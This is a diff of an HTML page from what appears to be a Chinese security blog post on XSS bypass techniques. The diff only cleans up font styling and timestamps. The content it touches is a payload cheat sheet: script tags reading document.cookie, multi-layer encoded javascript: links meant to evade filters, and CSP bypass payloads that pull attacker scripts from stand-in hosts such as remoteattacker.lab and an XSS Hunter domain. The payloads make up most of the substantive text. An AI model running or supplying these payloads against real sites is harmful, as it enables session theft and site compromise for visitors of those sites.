@@ -28,8 +28,8 @@
 <meta property="og:description" content="XSS绕过总结一、分类123反射性XSS存储型XSSDOM型XSS  反射型xss 攻击方式  1攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该目标用户的请求并进行处理，然后服务器把带有XSS的代码发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。   攻击步骤  12341.攻击者构造出特殊的URL，其中">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cbbzx12.github.io/images/head.jpg">
-<meta property="article:published_time" content="2025-12-24T11:57:52.988Z">
-<meta property="article:modified_time" content="2025-12-24T11:57:52.988Z">
+<meta property="article:published_time" content="2025-12-24T12:00:03.451Z">
+<meta property="article:modified_time" content="2025-12-24T12:00:03.451Z">
 <meta property="article:author" content="bug_001">
 <meta property="article:tag" content="Web知识点">
 <meta name="twitter:card" content="summary">
@@ -140,7 +140,7 @@
   <span class="sep"></span>
   <a class="cap breadcrumb" href="/wiki/Web%E7%9F%A5%E8%AF%86%E7%82%B9/xss/xss%E7%BB%95%E8%BF%87/">xss绕过</a>
   </div>
-<div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2025-12-24T11:57:52.988Z">2025-12-24</time></span></div></div></div>
+<div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2025-12-24T12:00:03.451Z">2025-12-24</time></span></div></div></div>
     
     <div class="bottom only-title">
       
@@ -200,25 +200,25 @@
 <h2 id="二、攻击荷载"><a href="#二、攻击荷载" class="headerlink" title="二、攻击荷载"></a>二、攻击荷载</h2><h3 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h3><table>
 <thead>
 <tr>
-<th align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;prompt&lt;/font&gt;</code></th>
-<th align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;prompt(1)&lt;/font&gt;</code></th>
-<th align="left"><font style="color:rgba(0, 0, 0, 0.9);">会弹输入框，点确定即算执行</font></th>
+<th align="left"><code>prompt</code></th>
+<th align="left"><code>prompt(1)</code></th>
+<th align="left">会弹输入框，点确定即算执行</th>
 </tr>
 </thead>
 <tbody><tr>
-<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;confirm&lt;/font&gt;</code></td>
-<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;confirm(1)&lt;/font&gt;</code></td>
-<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">弹确定&#x2F;取消框</font></td>
+<td align="left"><code>confirm</code></td>
+<td align="left"><code>confirm(1)</code></td>
+<td align="left">弹确定&#x2F;取消框</td>
 </tr>
 <tr>
-<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;open&lt;/font&gt;</code></td>
-<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;open(&#39;javascript:alert(1)&#39;)&lt;/font&gt;</code></td>
-<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">既弹窗又能加载伪协议</font></td>
+<td align="left"><code>open</code></td>
+<td align="left"><code>open(&#39;javascript:alert(1)&#39;)</code></td>
+<td align="left">既弹窗又能加载伪协议</td>
 </tr>
 <tr>
-<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;print&lt;/font&gt;</code></td>
-<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;print()&lt;/font&gt;</code></td>
-<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">调出打印对话框（部分浏览器）</font></td>
+<td align="left"><code>print</code></td>
+<td align="left"><code>print()</code></td>
+<td align="left">调出打印对话框（部分浏览器）</td>
 </tr>
 </tbody></table>
 <h3 id="script标签"><a href="#script标签" class="headerlink" title="script标签"></a>script标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"> 标签用于定义客户端脚本</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>             </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>                             </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>   </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://xxx.com/xss.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>
@@ -328,36 +328,36 @@
 
 <h5 id="混合编码"><a href="#混合编码" class="headerlink" title="混合编码"></a>混合编码</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">首先对“alert”进行JavaScript Unicode编码：</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:\u0061\u006C\u0065\u0072\u0074(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">然后再对 \u0061\u006c\u0065\u0072\u0074 进行URL编码：</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">最后对标签中的 javascript:%5c%75...%37%34(&quot;xss&quot;) 整体进行HTML编码即可：</span><br><span class="line"> <span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h2 id="四、CSP绕过"><a href="#四、CSP绕过" class="headerlink" title="四、CSP绕过"></a>四、CSP绕过</h2><h3 id="1-jsonp绕过"><a href="#1-jsonp绕过" class="headerlink" title="1.jsonp绕过"></a>1.jsonp绕过</h3><p><strong><font style="color:rgba(0, 0, 0, 0.87);">要求</font></strong><font style="color:rgba(0, 0, 0, 0.87);">：</font></p>
+<h2 id="四、CSP绕过"><a href="#四、CSP绕过" class="headerlink" title="四、CSP绕过"></a>四、CSP绕过</h2><h3 id="1-jsonp绕过"><a href="#1-jsonp绕过" class="headerlink" title="1.jsonp绕过"></a>1.jsonp绕过</h3><p><strong>要求</strong>：</p>
 <ul>
-<li><font style="color:rgba(0, 0, 0, 0.87);">CSP：</font><code>&lt;font style=&quot;color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);&quot;&gt;script-src &#39;self&#39; https://www.google.com https://www.youtube.com; object-src &#39;none&#39;;&lt;/font&gt;</code></li>
+<li>CSP：<code>script-src &#39;self&#39; https://www.google.com https://www.youtube.com; object-src &#39;none&#39;;</code></li>
 </ul>
-<h3 id="2-绕过-CSP-默认源"><a href="#2-绕过-CSP-默认源" class="headerlink" title="2.绕过 CSP 默认源"></a>2.绕过 CSP 默认源</h3><p><strong><font style="color:rgba(0, 0, 0, 0.87);">要求</font></strong><font style="color:rgba(0, 0, 0, 0.87);">：</font></p>
+<h3 id="2-绕过-CSP-默认源"><a href="#2-绕过-CSP-默认源" class="headerlink" title="2.绕过 CSP 默认源"></a>2.绕过 CSP 默认源</h3><p><strong>要求</strong>：</p>
 <ul>
-<li><font style="color:rgba(0, 0, 0, 0.87);">CSP 类似</font><code>&lt;font style=&quot;color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);&quot;&gt;Content-Security-Policy: default-src &#39;self&#39; &#39;unsafe-inline&#39;;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.87);">，</font></li>
+<li>CSP 类似<code>Content-Security-Policy: default-src &#39;self&#39; &#39;unsafe-inline&#39;;</code>，</li>
 </ul>
-<p><strong><font style="color:rgba(0, 0, 0, 0.87);">有效载荷</font></strong><font style="color:rgba(0, 0, 0, 0.87);">：</font></p>
-<p><code>&lt;font style=&quot;color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);&quot;&gt;http://example.lab/csp.php?xss=f=document.createElement%28&quot;iframe&quot;%29;f.id=&quot;pwn&quot;;f.src=&quot;/robots.txt&quot;;f.onload=%28%29=&gt;%7Bx=document.createElement%28%27script%27%29;x.src=%27//remoteattacker.lab/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;&lt;/font&gt;</code></p>
+<p><strong>有效载荷</strong>：</p>
+<p><code>http://example.lab/csp.php?xss=f=document.createElement%28&quot;iframe&quot;%29;f.id=&quot;pwn&quot;;f.src=&quot;/robots.txt&quot;;f.onload=%28%29=&gt;%7Bx=document.createElement%28%27script%27%29;x.src=%27//remoteattacker.lab/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">script=document.createElement(&#x27;script&#x27;);</span><br><span class="line">script.src=&#x27;//remoteattacker.lab/csp.js&#x27;;</span><br><span class="line">window.frames[0].document.head.appendChild(script);</span><br></pre></td></tr></table></figure>
 
-<h3 id="3-绕过-CSP-在线评估-iframe被禁止"><a href="#3-绕过-CSP-在线评估-iframe被禁止" class="headerlink" title="3.绕过 CSP 在线评估(iframe被禁止)"></a><font style="color:rgba(0, 0, 0, 0.87);">3.绕过 CSP 在线评估(iframe被禁止)</font></h3><p><strong><font style="color:rgba(0, 0, 0, 0.87);">要求</font></strong><font style="color:rgba(0, 0, 0, 0.87);">：</font></p>
+<h3 id="3-绕过-CSP-在线评估-iframe被禁止"><a href="#3-绕过-CSP-在线评估-iframe被禁止" class="headerlink" title="3.绕过 CSP 在线评估(iframe被禁止)"></a>3.绕过 CSP 在线评估(iframe被禁止)</h3><p><strong>要求</strong>：</p>
 <ul>
-<li><font style="color:rgba(0, 0, 0, 0.87);">CSP或 CSP</font><code>&lt;font style=&quot;color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);&quot;&gt;inline&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.87);">或</font><code>&lt;font style=&quot;color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);&quot;&gt;eval&lt;/font&gt;</code></li>
+<li>CSP或 CSP<code>inline</code>或<code>eval</code></li>
 </ul>
-<p><strong><font style="color:rgba(0, 0, 0, 0.87);">有效载荷</font></strong><font style="color:rgba(0, 0, 0, 0.87);">：</font></p>
-<p><font style="color:rgba(0, 0, 0, 0.87);">d&#x3D;document;f&#x3D;d.createElement(“iframe”);f.src&#x3D;d.querySelector(‘link[href*&#x3D;”.css”]’).href;d.body.append(f);s&#x3D;d.createElement(“script”);s.src&#x3D;”https:&#x2F;&#x2F;[YOUR_XSSHUNTER_USERNAME].xss.ht”;setTimeout(function(){f.contentWindow.document.head.append(s);},1000)</font></p>
-<h3 id="4-绕过-CSP-脚本源自身"><a href="#4-绕过-CSP-脚本源自身" class="headerlink" title="4.绕过 CSP 脚本源自身"></a>4.<font style="color:rgba(0, 0, 0, 0.87);">绕过 CSP 脚本源自身</font></h3><p><strong><font style="color:rgba(0, 0, 0, 0.87);">要求</font></strong><font style="color:rgba(0, 0, 0, 0.87);">：</font></p>
+<p><strong>有效载荷</strong>：</p>
+<p>d&#x3D;document;f&#x3D;d.createElement(“iframe”);f.src&#x3D;d.querySelector(‘link[href*&#x3D;”.css”]’).href;d.body.append(f);s&#x3D;d.createElement(“script”);s.src&#x3D;”https:&#x2F;&#x2F;[YOUR_XSSHUNTER_USERNAME].xss.ht”;setTimeout(function(){f.contentWindow.document.head.append(s);},1000)</p>
+<h3 id="4-绕过-CSP-脚本源自身"><a href="#4-绕过-CSP-脚本源自身" class="headerlink" title="4.绕过 CSP 脚本源自身"></a>4.绕过 CSP 脚本源自身</h3><p><strong>要求</strong>：</p>
 <ul>
-<li><font style="color:rgba(0, 0, 0, 0.87);">类似 CSP</font><code>&lt;font style=&quot;color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);&quot;&gt;script-src self&lt;/font&gt;</code></li>
+<li>类似 CSP<code>script-src self</code></li>
 </ul>
-<p><strong><font style="color:rgba(0, 0, 0, 0.87);">有效载荷</font></strong><font style="color:rgba(0, 0, 0, 0.87);">：</font></p>
-<p><font style="color:rgba(0, 0, 0, 0.87);">&lt;object data&#x3D;”data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg&#x3D;&#x3D;”&gt;&lt;&#x2F;object&gt;</font></p>
-<h3 id="5-绕过-CSP-脚本源数据"><a href="#5-绕过-CSP-脚本源数据" class="headerlink" title="5.绕过 CSP 脚本源数据"></a><font style="color:rgba(0, 0, 0, 0.87);">5.绕过 CSP 脚本源数据</font></h3><p><strong><font style="color:rgba(0, 0, 0, 0.87);">要求</font></strong><font style="color:rgba(0, 0, 0, 0.87);">：</font></p>
+<p><strong>有效载荷</strong>：</p>
+<p>&lt;object data&#x3D;”data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg&#x3D;&#x3D;”&gt;&lt;&#x2F;object&gt;</p>
+<h3 id="5-绕过-CSP-脚本源数据"><a href="#5-绕过-CSP-脚本源数据" class="headerlink" title="5.绕过 CSP 脚本源数据"></a>5.绕过 CSP 脚本源数据</h3><p><strong>要求</strong>：</p>
 <ul>
-<li><font style="color:rgba(0, 0, 0, 0.87);">CSP 就像</font><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src"><font style="color:rgb(64, 81, 181);">Mozilla</font></a><code>&lt;font style=&quot;color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);&quot;&gt;script-src &#39;self&#39; data:&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.87);">官方文档中警告的那样</font><font style="color:rgba(0, 0, 0, 0.87);">。</font></li>
+<li>CSP 就像<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src">Mozilla</a><code>script-src &#39;self&#39; data:</code>官方文档中警告的那样。</li>
 </ul>
-<p><strong><font style="color:rgba(0, 0, 0, 0.87);">有效载荷</font></strong><font style="color:rgba(0, 0, 0, 0.87);">：</font></p>
-<p><font style="color:rgba(0, 0, 0, 0.87);">&lt;script src&#x3D;”data:,alert(1)”&gt;&#x2F;&lt;&#x2F;script&gt;</font></p>
+<p><strong>有效载荷</strong>：</p>
+<p>&lt;script src&#x3D;”data:,alert(1)”&gt;&#x2F;&lt;&#x2F;script&gt;</p>
 </article>
 <div class="article-footer">
 
